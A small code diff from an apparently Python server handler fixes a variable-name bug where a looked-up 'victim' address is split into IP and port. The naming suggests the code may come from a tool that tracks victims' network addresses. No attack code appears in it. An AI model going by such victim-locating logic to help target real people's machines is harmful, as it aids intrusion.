@@ -39,7 +39,7 @@ def incomingrequest():
         case "GETIP":
             victimid = json["VictimID"]
             victimaddress = database.get_client_address(victimid)
-            victimaddress = address.split(":")
+            victimaddress = victimaddress.split(":")
             victimip = victimaddress[0]
             victimport = victimaddress[1]
             print(f"GETIP: {clientid}, {victimid}, {victimaddress}")
